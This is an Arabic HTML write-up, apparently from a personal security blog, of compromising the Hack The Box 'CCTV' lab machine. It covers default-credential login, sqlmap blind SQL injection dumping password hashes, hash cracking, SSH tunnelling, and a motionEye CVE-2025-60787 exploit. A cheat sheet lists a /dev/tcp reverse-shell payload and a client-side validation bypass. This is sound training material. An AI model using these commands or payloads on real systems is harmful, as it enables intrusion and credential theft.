@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#07110d">
+  <meta name="color-scheme" content="dark light">
+  <meta name="description" content="تقرير CTF تقني لتحدي Write-up CCTV HTB على منصة Hack The Box.">
+  <title>Write-up CCTV HTB | Ft7y.Sec</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="icon" href="../avatar.png" type="image/png">
+</head>
+<body>
+  <a class="skip-link" href="#main-content">تخطي إلى المحتوى</a>
+  <div class="scroll-progress" id="scroll-progress" aria-hidden="true"></div>
+  <div class="page-noise" aria-hidden="true"></div>
+  <canvas id="particles-canvas"></canvas>
+  <header class="navbar" id="navbar">
+    <div class="logo"><a href="../index.html#home">Ft7y<span>.Sec</span></a></div>
+    <nav class="nav-links" id="nav-menu" aria-label="التنقل الرئيسي"><ul>
+      <li><a href="../index.html#home">الرئيسية</a></li>
+      <li><a href="../pentest.html">اختبار الاختراق</a></li>
+      <li><a href="../appsec.html">أمن التطبيقات</a></li>
+      <li><a href="../automation.html">البرمجة والأتمتة</a></li>
+      <li><a href="../systems-labs.html">الأنظمة والمعامل</a></li>
+      <li><a href="../writeups.html">CTF Write-ups</a></li>
+      <li><a href="../index.html#contact">تواصل معي</a></li>
+    </ul></nav>
+    <div class="nav-actions">
+      <button id="theme-toggle" class="btn-secondary" type="button" title="تبديل الوضع" aria-label="تبديل الوضع"><i class="fa-solid fa-moon"></i></button>
+      <button class="mobile-toggle" id="mobile-toggle" type="button" aria-label="القائمة"><i class="fa-solid fa-bars"></i></button>
+    </div>
+  </header>
+  <main id="main-content" class="subpage-container ctf-report-page">
+    <article class="ctf-report-article">
+      <header class="subpage-hero ctf-report-hero" data-aos="fade-up">
+        <nav class="breadcrumb-nav" aria-label="مسار التنقل"><a href="../index.html"><i class="fa-solid fa-house"></i> الرئيسية</a><span class="sep">/</span><a href="index.html">تقارير CTF</a><span class="sep">/</span><span class="current">Write-up CCTV HTB</span></nav>
+        <div class="writeup-header"><span class="platform-tag htb"><i class="fa-solid fa-cube"></i> Hack The Box</span><span class="ctf-directory-label"><i class="fa-solid fa-shield-halved"></i> بيئة تدريبية مصرح بها</span></div>
+        <h1 class="subpage-hero-title">Write-up CCTV HTB</h1>
+        <p class="subpage-hero-desc">توثيق تقني محفوظ من المصدر الأصلي في Notion، يشمل الخطوات والأوامر والنتائج ولقطات الشاشة المتاحة.</p>
+        <a href="index.html" class="btn-outline ctf-back-link"><i class="fa-solid fa-arrow-right"></i> العودة إلى تقارير CTF</a>
+      </header>
+      <div class="ctf-report-content" data-aos="fade-up"><h2>تقرير اختبار الاختراق: جهاز CCTV (Hack The Box) {color=&quot;green&quot;}</h2><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-writeup-1.png" alt="لقطة شاشة من تقرير Write-up CCTV HTB" loading="lazy"><figcaption>لقطة شاشة من تقرير Write-up CCTV HTB</figcaption></figure><p><strong>تاريخ التقرير:</strong> مايو 2026</p><p><strong>المعد:</strong> خبير الأمن السيبراني (مساعد AI) بالتعاون والتدقيق الكامل من  مختبر الاختراق {color=&quot;blue&quot;}</p><h3>1. الملخص التنفيذي (Executive Summary)</h3><p>&gt; *<em>يوثق هذا التقرير مسار اختراق جهاز &quot;CCTV&quot; ضمن بيئة تعليمية (CTF). بدأ الهجوم بفحص الشبكة واكتشاف تطبيق ZoneMinder لإدارة الكاميرات. من خلال استخدام بيانات دخول افتراضية، تم الوصول للوحة التحكم واستغلال ثغرة SQL Injection لاستخراج تجزئة (Hash) كلمة مرور المستخدم </em><strong><em><code dir="ltr">mark</code></em></strong><em>. بعد كسر التشفير، تم الوصول للنظام عبر SSH.</em>*</p><p>&gt; <strong>خلال الاستطلاع الداخلي (Post-Exploitation)، تم اكتشاف خدمة motionEye تعمل داخلياً. باستخدام تقنية توجيه المنافذ (Port Forwarding)، تم الوصول لواجهة الويب الخاصة بالخدمة، واستغلال ثغرة تنفيذ أوامر (RCE / Command Injection) للحصول على جلسة بصلاحيات Root والسيطرة الكاملة على النظام.</strong></p><p>---</p><h3>2. <strong>تفاصيل سير العمل (Detailed Walkthrough)</strong></h3><h4><strong>المرحلة الأولى: الاستطلاع وجمع المعلومات (Reconnaissance)</strong></h4><p>&gt; بدأت العملية بفحص المنافذ المفتوحة باستخدام أداة <code dir="ltr">nmap</code>.</p><ul class="ctf-report-list"><li><strong>النتائج:</strong> تم اكتشاف المنفذ <code dir="ltr">22</code> (SSH) والمنفذ <code dir="ltr">80</code> (HTTP) يعمل عليه خادم Apache (إصدار 2.4.58) ونظام التشغيل Ubuntu.</li></ul><ul class="ctf-report-list"><li><strong>إعداد البيئة:</strong> تم إضافة النطاق <code dir="ltr">cctv.htb</code> إلى ملف <code dir="ltr">/etc/hosts</code> لضمان التوجيه الصحيح.</li></ul><p>-</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-writeup-2.png" alt="لقطة شاشة من تقرير Write-up CCTV HTB" loading="lazy"><figcaption>لقطة شاشة من تقرير Write-up CCTV HTB</figcaption></figure><h4>المرحلة الثانية: الوصول الأولي (Initial Access) عبر ZoneMinder</h4><p>عند تصفح الموقع، تم اكتشاف نظام <strong>ZoneMinder</strong> (الإصدار 1.37.63).</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-writeup-3.png" alt="لقطة شاشة من تقرير Write-up CCTV HTB" loading="lazy"><figcaption>لقطة شاشة من تقرير Write-up CCTV HTB</figcaption></figure><h4>*<em>الثغرة المنطقية: تم تسجيل الدخول بنجاح باستخدام البيانات الافتراضية </em><strong><em><code dir="ltr">admin:admin</code></em></strong><em>.</em>*</h4><p>-</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-writeup-4.png" alt="لقطة شاشة من تقرير Write-up CCTV HTB" loading="lazy"><figcaption>لقطة شاشة من تقرير Write-up CCTV HTB</figcaption></figure><p>&gt; <strong>محاولة RCE:</strong> جرت محاولة مبدئية لاستغلال ثغرة (CVE-2023-26035) لإنشاء Reverse Shell عبر مسار <code dir="ltr">/zm/index.php</code>، إلا أن جدار الحماية أو إعدادات النظام منعت الاتصال العكسي المباشر.</p><p>-</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-writeup-5.png" alt="لقطة شاشة من تقرير Write-up CCTV HTB" loading="lazy"><figcaption>لقطة شاشة من تقرير Write-up CCTV HTB</figcaption></figure><h4>المرحلة الثالثة: استغلال قاعدة البيانات (SQL Injection)</h4><p>للتغلب على العائق السابق، تم تحويل مسار الهجوم للبحث عن ثغرات في قاعدة البيانات.</p><ul class="ctf-report-list"><li>تم تحديد المعامل <code dir="ltr">tid</code> في الرابط كـ مُدخل قابل للحقن.</li><li>باستخدام أداة <code dir="ltr">sqlmap</code> ومع إرفاق ملف تعريف الارتباط (Cookie) لجلسة الأدمن، تم تأكيد وجود ثغرة <strong>Time-Based Blind SQLi</strong>.</li><li><strong>استخراج البيانات:</strong> تم استخراج جدول المستخدمين، والحصول على تجزئة (Hash) من نوع <code dir="ltr">Bcrypt</code> للمستخدم <code dir="ltr">mark</code>.</li></ul><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>┌──(kali㉿kali)-[~/Downloads]
+└─$ sqlmap -u &quot;http://cctv.htb/zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1&quot; \
+-D zm -T Users -C Username,Password --dump --batch \
+--dbms=MySQL --technique=T \
+--cookie=&quot;ZMSESSID=iapklkkpdtihs4usubfk0ameo9&quot; \
+--time-sec=2
+        ___
+       __H__                                                                                                                       
+ ___ ___[)]_____ ___ ___  {1.9.5#stable}                                                                                           
+|_ -| . [.]     | .&#39;| . |                                                                                                          
+|___|_  [&#39;]_|_|_|__,|  _|                                                                                                          
+      |_|V...       |_|   https://sqlmap.org                                                                                       
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:33:34 /2026-05-09/
+
+[17:33:34] [INFO] testing connection to the target URL
+[17:33:35] [WARNING] heuristic (basic) test shows that GET parameter &#39;view&#39; might not be injectable
+[17:33:35] [INFO] testing for SQL injection on GET parameter &#39;view&#39;
+[17:33:35] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;
+[17:33:35] [WARNING] time-based comparison requires larger statistical model, please wait............................ (done)      
+[17:33:44] [WARNING] GET parameter &#39;view&#39; does not seem to be injectable
+[17:33:44] [WARNING] heuristic (basic) test shows that GET parameter &#39;request&#39; might not be injectable
+[17:33:44] [INFO] testing for SQL injection on GET parameter &#39;request&#39;
+[17:33:44] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;
+[17:33:45] [WARNING] GET parameter &#39;request&#39; does not seem to be injectable
+[17:33:46] [WARNING] heuristic (basic) test shows that GET parameter &#39;action&#39; might not be injectable
+[17:33:46] [INFO] testing for SQL injection on GET parameter &#39;action&#39;
+[17:33:46] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;
+[17:33:47] [WARNING] GET parameter &#39;action&#39; does not seem to be injectable
+[17:33:47] [WARNING] heuristic (basic) test shows that GET parameter &#39;tid&#39; might not be injectable
+[17:33:48] [INFO] testing for SQL injection on GET parameter &#39;tid&#39;
+[17:33:48] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;
+[17:33:53] [INFO] GET parameter &#39;tid&#39; appears to be &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39; injectable 
+for the remaining tests, do you want to include all tests for &#39;MySQL&#39; extending provided level (1) and risk (1) values? [Y/n] Y
+[17:33:53] [INFO] checking if the injection point on GET parameter &#39;tid&#39; is a false positive
+GET parameter &#39;tid&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
+---
+Parameter: tid (GET)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: view=request&amp;request=event&amp;action=removetag&amp;tid=1 AND (SELECT 4841 FROM (SELECT(SLEEP(2)))tkZz)
+---
+[17:34:02] [INFO] the back-end DBMS is MySQL
+[17:34:02] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL &gt;= 5.0.12
+[17:34:03] [INFO] fetching entries of column(s) &#39;Password,Username&#39; for table &#39;Users&#39; in database &#39;zm&#39;
+[17:34:03] [INFO] fetching number of column(s) &#39;Password,Username&#39; entries for table &#39;Users&#39; in database &#39;zm&#39;
+[17:34:03] [INFO] retrieved: 3
+[17:34:11] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+$2y$10$cmy
+[17:35:50] [ERROR] invalid character detected. retrying..
+tVWFRn
+[17:36:54] [ERROR] invalid character detected. retrying..
+t1XfqsItsJR^X@sgVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
+[17:43:16] [INFO] retrieved: superadmin
+[17:44:32] [INFO] retrieved: $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
+[17:53:51] [INFO] retrieved: mark
+[17:54:20] [INFO] retrieved: $2y$10$t
+[17:55:40] [ERROR] invalid character detected. retrying..
+5z8uIT.n9uCdHCNidcLf.39T
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+1y
+Ui9nrlCkdXrzJMnJgkT
+[18:02:46] [ERROR] invalid character detected. retrying..
+iAvRUM6m
+[18:04:00] [INFO] retrieved: admin
+Database: zm
+Table: Users
+[3 entries]
++------------+--------------------------------------------------------------+
+| Username   | Password                                                     |
++------------+--------------------------------------------------------------+
+| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
+| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
+| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
++------------+--------------------------------------------------------------+
+
+[18:04:37] [INFO] table &#39;zm.Users&#39; dumped to CSV file &#39;/home/kali/.local/share/sqlmap/output/cctv.htb/dump/zm/Users.csv&#39;
+[18:04:37] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 1690 times
+[18:04:37] [INFO] fetched data logged to text files under &#39;/home/kali/.local/share/sqlmap/output/cctv.htb&#39;
+[18:04:37] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 18:04:37 /2026-05-09/
+
+                                                                                                                                   
+┌──(kali㉿kali)-[~/Downloads]
+</code></pre></section><h4>المرحلة الرابعة: كسر التشفير والوصول للنظام</h4><ul class="ctf-report-list"><li>تم حفظ التجزئة المستخرجة (<code dir="ltr">$2y$10$...</code>) في ملف نصي.</li><li>باستخدام أداة <code dir="ltr">John the Ripper</code> وقائمة كلمات <code dir="ltr">rockyou.txt</code>، تم كسر التشفير بنجاح، وكلمة المرور المستخرجة هي: <code dir="ltr">opensesame</code>.</li></ul><p>-</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-writeup-6.png" alt="لقطة شاشة من تقرير Write-up CCTV HTB" loading="lazy"><figcaption>لقطة شاشة من تقرير Write-up CCTV HTB</figcaption></figure><ul class="ctf-report-list"><li>تم تسجيل الدخول بنجاح عبر بروتوكول <strong>SSH</strong> بصلاحيات المستخدم <code dir="ltr">mark</code>. (تم الحصول على وصول للمستوى الأول).</li></ul><h4>المرحلة الخامسة: الاستطلاع الداخلي وتوجيه المنافذ (Lateral Movement)</h4><p>أثناء فحص ملفات النظام كمستخدم <code dir="ltr">mark</code>، تم الآتي:</p><ul class="ctf-report-list"><li>ملاحظة وجود مستخدم آخر يسمى <code dir="ltr">sa_mark</code> ومجلدات لا يمكن الوصول إليها.</li><li>اكتشاف إعدادات لخدمة <strong>motionEye</strong> في المسار <code dir="ltr">/etc/motioneye/motioneye.conf</code>.</li><li>8765</li></ul><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-writeup-7.png" alt="لقطة شاشة من تقرير Write-up CCTV HTB" loading="lazy"><figcaption>لقطة شاشة من تقرير Write-up CCTV HTB</figcaption></figure><ul class="ctf-report-list"><li><strong>لان لوحة تحكم ال WEB الخاصة ب motioneye  تعمل  داخليا فقط على الشبكة المحلية 127.0.0.1 على  منفذ 8765&lt;br&gt;قمنا بالتوجيه (Tunneling):</strong> تم إنشاء نفق SSH لربط المنفذ المحلي <code dir="ltr">8765</code> بالمنفذ <code dir="ltr">8765</code> على جهازناص المهاجم للتمكن من تصفح واجهة motionEye.</li></ul><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>mark@cctv:~$ ssh -L 8765:127.0.0.1:8765 mark@cctv.htb 
+mark@cctv.htb&#39;s password:opensesame</code></pre></section><h4>المرحلة السادسة: تصعيد الصلاحيات إلى Root (Privilege Escalation)</h4><ul class="ctf-report-list"><li>تم الدخول لواجهة motionEye عبر المتصفح باستخدام المستخدم الافتراضي <code dir="ltr">admin</code> وكلمة مرور التي وجدناها اثناء قرائتنا للملفات</li></ul><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>mark@cctv:/usr$ cat /etc/motioneye/motion.conf 
+# @admin_username admin
+# @normal_username user
+# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
+# @lang en
+# @enabled on
+# @normal_password 
+
+
+setup_mode off
+webcontrol_port 7999
+webcontrol_interface 1
+webcontrol_localhost on
+webcontrol_parms 2
+
+camera camera-1.conf</code></pre></section><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-writeup-8.png" alt="لقطة شاشة من تقرير Write-up CCTV HTB" loading="lazy"><figcaption>لقطة شاشة من تقرير Write-up CCTV HTB</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-writeup-9.png" alt="لقطة شاشة من تقرير Write-up CCTV HTB" loading="lazy"><figcaption>لقطة شاشة من تقرير Write-up CCTV HTB</figcaption></figure><ol class="ctf-report-list"><li><strong>تجاوز الحماية (Bypass):</strong> منعت الواجهة الرسومية إدخال أوامر معقدة، فتم استخدام وحدة تحكم المتصفح (Console) لحقن كود JavaScript                ;<code dir="ltr">configUIValid = function() { return true; }</code><code dir="ltr">       &lt;br&gt;</code>) لتخطي التحقق.</li></ol><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-writeup-10.png" alt="لقطة شاشة من تقرير Write-up CCTV HTB" loading="lazy"><figcaption>لقطة شاشة من تقرير Write-up CCTV HTB</figcaption></figure><p>-</p><ul class="ctf-report-list"><li><strong>تنفيذ الأوامر (RCE):</strong> في إعدادات الكاميرا (قسم Motion Notifications / Still Images)، تم تفعيل خيار تنفيذ أمر (Run A Command) وحقن Payload من نوع Reverse Bash Shell.</li><li>عن طريق استخدام استغلال جاهز يمكنك تنزيله من هنا :</li></ul><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>──(kali㉿kali)-[~/Downloads]
+└─$ git clone https://github.com/gunzf0x/CVE-2025-60787.git                                     
+Cloning into &#39;CVE-2025-60787&#39;...
+remote: Enumerating objects: 7, done.
+remote: Counting objects: 100% (7/7), done.
+remote: Compressing objects: 100% (6/6), done.
+remote: Total 7 (delta 1), reused 7 (delta 1), pack-reused 0 (from 0)
+Receiving objects: 100% (7/7), 5.54 KiB | 1.11 MiB/s, done.
+Resolving deltas: 100% (1/1), done.
+                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cd CVE-2025-60787   
+                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/CVE-2025-60787]
+└─$ ls    
+CVE-2025-60787.py  README.md
+                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/CVE-2025-60787]
+└─$ cat README.md    
+# CVE-2025-60787 - Authenticated RCE in motionEye
+
+PoC for [CVE-2025-60787](https://nvd.nist.gov/vuln/detail/CVE-2025-60787) that is an Authenticated RCE vulnerability for [motionEye](https://github.com/motioneye-project/motioneye) with all afected versions up to 0.43.1b4 (included).
+
+This is an automated PoC for the vulnerability described in [this repository](https://github.com/prabhatverma47/CVE-2025-60787). Credits to [prabhatverma47](https://github.com/prabhatverma47/).
+
+## Usage
+The script has 2 commands that abuse the vulnerability. One that directly sends a reverse shell called `revshell` and another command called `command` to directly execute commands abusing this CVE.
+</code></pre></section><p>❯ python3 CVE-2025-60787.py -h</p><p>usage: CVE-2025-60787.py [-h] {revshell,command} ...</p><p>PoC for CVE-2025-60787 -- Authenticated RCE in motionEye by gunzf0x</p><p>positional arguments:</p><p>{revshell,command}  Choose between send a reverse shell or (attempting to) run commands</p><p>revshell          Attempt to send a reverse shell using CVE-2025-60787 vuln</p><p>command           Execute a command remotely using CVE-2025-60787 vuln</p><p>options:</p><p>-h, --help          show this help message and exit</p><h4>Reverse Shell</h4><p>Use <code dir="ltr">revshell</code> command to obtain a shell. For example:</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">shell</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>python3 CVE-2025-60787.py revshell --url &#39;http://10.10.10.10:8765&#39; --user &#39;admin&#39; --password &#39;StrongPassw0rd123!&#39; -i 10.10.10.15 --port 9001</code></pre></section><p>Where <code dir="ltr">10.10.10.10</code> is the target machine (machine running <code dir="ltr">motionEye</code>), <code dir="ltr">10.10.10.15</code> is our attacker machine and <code dir="ltr">9001</code> is the prot we are listening to catch a reverse shell.</p><h4>Command Execution</h4><p>If instead of a reverse shell we want to execute other commands remotely, we can use <code dir="ltr">command</code> option. For example, execute the command <code dir="ltr">ping -c1 10.10.10.15</code> in the victim machine:</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">shell</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>python3 CVE-2025-60787.py command --url &#39;http://10.10.10.10:8765&#39; --user &#39;admin&#39; --password &#39;StrongPassw0rd123!&#39; -e &#39;ping -c1 10.10.10.15&#39;</code></pre></section><p>Where <code dir="ltr">10.10.10.10</code> is the machine running <code dir="ltr">motionEye</code>.</p><h3>Disclaimer</h3><p>Use this script always under your own responsability.</p><p>Be ethical (:</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-writeup-11.png" alt="لقطة شاشة من تقرير Write-up CCTV HTB" loading="lazy"><figcaption>لقطة شاشة من تقرير Write-up CCTV HTB</figcaption></figure><ul class="ctf-report-list"><li>قم بتشعيل الاستغلال باستخدام الامر التالي :</li><li>اولا قم بتشغيل جلسة استماع باستخدام  nc ثم شعل الاستغلال وستستلم shell as Root</li></ul><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code> python3 CVE-2025-60787.py revshell \
+--url &#39;http://127.0.0.1:8765&#39; \
+--user &#39;admin&#39; \
+--password &#39;989c5a8ee87a0e9521ec81a79187d162109282f0&#39; \
+-i &lt;your-IP&gt; \
+--port 4444</code></pre></section><ul class="ctf-report-list"><li><strong>النتيجة النهائية:</strong> نظراً لأن خدمة motionEye كانت تعمل بصلاحيات عالية، تم استلام الجلسة (Shell) بصلاحيات <strong>Root</strong> مباشرة، وتم قراءة الـ <code dir="ltr">user.txt</code> والـ <code dir="ltr">root.txt</code>.</li></ul><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.38] from (UNKNOWN) [10.129.53.67] 34172
+bash: cannot set terminal process group (11461): Inappropriate ioctl for device
+bash: no job control in this shell
+root@cctv:/etc/motioneye# ls
+</code></pre></section><p>-</p><h3>3. قائمة الأوامر المستغلة (Command Cheat Sheet)</h3><h4>الاستطلاع (Recon)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">plain text</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>sudo nmap -sV -sC -Pn 10.129.50.173
+echo &#39;10.129.50.173 cctv.htb&#39; | sudo tee -a /etc/hosts
+gobuster dir -u [http://cctv.htb/](http://cctv.htb/) -w /usr/share/wordlists/dirb/common.txt</code></pre></section><h4>استغلال SQL Injection</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">plain text</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>sqlmap -u &quot;[http://cctv.htb/zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1](http://cctv.htb/zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1)&quot; \
+-D zm -T Users -C Username,Password --dump --batch \
+--dbms=MySQL --technique=T \
+--cookie=&quot;ZMSESSID=[Your_Cookie_Here]&quot;</code></pre></section><h4>كسر التشفير (Password Cracking)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">plain text</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>echo &#39;$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.&#39; &gt; markhash.txt
+john --format=bcrypt markhash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre></section><h4>الاتصال والاستطلاع الداخلي</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">plain text</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>ssh mark@cctv.htb
+# البحث عن ملفات SUID
+find / -perm -u=s -type f 2&gt;/dev/null
+# البحث عن إعدادات motionEye
+find / -type f -name motioneye.conf 2&gt;/dev/null
+cat /etc/motioneye/motioneye.conf</code></pre></section><h4>توجيه المنافذ (SSH Tunneling)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">plain text</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code># ربط منفذ 8765 الداخلي ليكون متاحاً على جهاز المهاجم
+ssh -L 8765:127.0.0.1:8765 mark@cctv.htb</code></pre></section><h4>تجاوز قيود واجهة الويب (Browser Console Bypass)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">plain text</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>// كود يكتب في وحدة تحكم المتصفح (F12) لتخطي فحص المدخلات
+configUIValid = function() { return true; };</code></pre></section><h4>كود الاتصال العكسي (Reverse Shell Payload)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">plain text</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code># تم حقنه داخل واجهة motionEye
+bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.38/4444 0&gt;&amp;1&#39;</code></pre></section><h4>تثبيت الجلسة (Shell Stabilization)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">plain text</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre></section><h3>4. ملخص الثغرات والتوصيات (Vulnerabilities &amp; Mitigation)</h3><ol class="ctf-report-list"><li><strong>استخدام بيانات دخول افتراضية (Default Credentials):</strong> \<em> </em>المشكلة:* وجود <code dir="ltr">admin:admin</code> في ZoneMinder وكلمة مرور فارغة في motionEye.</li></ol><ul class="ctf-report-list"><li><em>الحل:</em> فرض تغيير كلمات المرور الافتراضية عند التثبيت الأول وتطبيق سياسة كلمات مرور معقدة.</li></ul><ol class="ctf-report-list"><li><strong>ثغرة حقن قواعد البيانات (Blind SQL Injection):</strong></li></ol><ul class="ctf-report-list"><li><em>المشكلة:</em> عدم فلترة المعامل <code dir="ltr">tid</code> قبل إرساله لقاعدة البيانات.</li><li><em>الحل:</em> استخدام الاستعلامات المجهزة (Parameterized Queries / Prepared Statements) في كود الـ PHP.</li></ul><ol class="ctf-report-list"><li><strong>ضعف في التشفير / إعادة استخدام كلمة المرور:</strong></li></ol><ul class="ctf-report-list"><li><em>المشكلة:</em> كلمة مرور حساب <code dir="ltr">mark</code> كانت ضعيفة (<code dir="ltr">opensesame</code>) وموجودة في قواميس الاختراق المعروفة.</li><li><em>الحل:</em> توعية المستخدمين وتطبيق آليات حماية حسابات النظام (PAM).</li></ul><ol class="ctf-report-list"><li><strong>تنفيذ أوامر عن بعد (Command Injection / RCE):</strong></li></ol><ul class="ctf-report-list"><li><em>المشكلة:</em> واجهة motionEye تسمح بتمرير أوامر نظام التشغيل مباشرة دون تعقيم (Sanitization) حقيقي في الواجهة الخلفية.</li><li><em>الحل:</em> تحديث motionEye إلى إصدار مرقع (Patched)، وتقييد الصلاحيات التي تعمل بها خدمة الويب لتكون أقل الصلاحيات الممكنة (Least Privilege) وعدم تشغيلها كـ Root.</li></ul></div>
+      <footer class="ctf-report-end"><a href="index.html" class="btn-primary"><i class="fa-solid fa-arrow-right"></i> كل تقارير CTF</a></footer>
+    </article>
+  </main>
+  <footer class="footer"><div class="footer-content">
+    <div class="footer-logo">Ft7y<span>.Sec</span></div>
+    <div class="footer-links">
